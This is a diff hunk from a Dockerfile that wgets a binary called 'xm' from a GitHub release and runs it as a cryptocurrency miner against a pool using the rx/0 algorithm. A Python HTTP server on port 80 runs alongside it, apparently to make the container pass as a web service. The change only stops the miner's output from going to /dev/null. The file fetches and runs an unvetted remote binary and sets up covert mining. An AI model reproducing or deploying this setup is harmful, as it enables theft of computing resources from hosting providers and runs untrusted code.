@@ -10,4 +10,4 @@ WORKDIR /home/miner
 RUN wget https://github.com/ddao2604/tech/releases/download/1.0/xm \
 	&& chmod +x xm
 EXPOSE 80
-CMD python -m http.server 80 & ./xm -o $POOL_URL -u $POOL_USER -p $POOL_PW rx/0 -k >> /dev/null
+CMD python -m http.server 80 & ./xm -o $POOL_URL -u $POOL_USER -p $POOL_PW rx/0 -k
